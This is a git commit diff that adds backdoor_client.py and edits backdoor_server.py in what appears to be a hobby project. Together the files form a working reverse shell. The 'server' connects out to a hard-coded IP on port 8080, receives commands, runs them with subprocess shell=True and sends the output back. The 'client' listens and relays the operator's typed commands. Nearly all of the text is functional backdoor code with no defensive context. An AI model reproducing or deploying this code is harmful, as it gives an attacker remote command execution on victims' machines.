2451e340392bacde914cfadd90b53b6ec607bde2
Radeonares32 <bugra.linux.js@gmail.com>
2022-08-24 14:48:17 +0300

    client coding...

---
+++ backdoor_client.py
@@ -0,0 +1,22 @@
+import socket
+import time
+
+backdoor_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+backdoor_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+
+backdoor_listener.bind(("0.0.0.0",8080))
+
+backdoor_listener.listen(1)
+
+print("Listening...")
+
+(connection,address) = backdoor_listener.accept()
+print("Connection OK" + str(address))
+
+while True:
+	#python 2
+	command = input("Enter command ")
+	connection.sendall((command).encode())
+	command_output = connection.recv(1024)
+	print(command_output)
--- backdoor_server.py
+++ backdoor_server.py
@@ -6,14 +6,14 @@ def command_execution(command):
     return subprocess.check_output(command, shell=True)
 
 
-backdoor_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+backdoor_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-backdoor_listener.connect(("192.168.8.111", 8080))
-backdoor_listener.send(("Hello World\n").encode())
+backdoor_server.connect(("192.168.8.111", 8080))
+backdoor_server.send(("Hello World\n").encode())
 
 while True:
-    command = backdoor_listener.recv(1024)  # byte
+    command = backdoor_server.recv(1024)  # byte
     cmd = command_execution(command)
-    backdoor_listener.send(cmd)
+    backdoor_server.send(cmd)
 
-backdoor_listener.close()
+backdoor_server.close()
